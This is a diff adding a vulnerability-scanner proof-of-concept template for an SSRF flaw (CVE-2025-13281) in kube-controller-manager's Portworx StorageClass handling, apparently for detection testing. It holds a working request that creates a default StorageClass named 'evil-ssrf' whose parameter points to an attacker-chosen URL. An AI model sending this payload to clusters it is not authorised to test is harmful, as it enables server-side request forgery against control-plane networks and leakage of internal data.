@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "检测 kube-controller-manager 中 Portworx StorageClass 配置下的 SSRF 漏洞，通过构造恶意存储类触发控制器向控制平面主机网络中未保护的端点发起请求，验证是否存在信息泄露风险"
+id = "POC-AVE-2025-0556"
+name = "Portworx kube-controller-manager SSRF PoC"
+severity = "medium"
+tags = ["ave-2025-0556"]
+vuln_id = [
+    "CVE-2025-13281",
+    "AVE-2025-0556",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/v1/namespaces/kube-system/storageclasses"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"apiVersion":"storage.k8s.io/v1","kind":"StorageClass","metadata":{"name":"evil-ssrf","annotations":{"storageclass.kubernetes.io/is-default-class":"true"}},"provisioner":"portworx","parameters":{"storage": "{{MaliciousURL}}"}}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["metadata.name"]
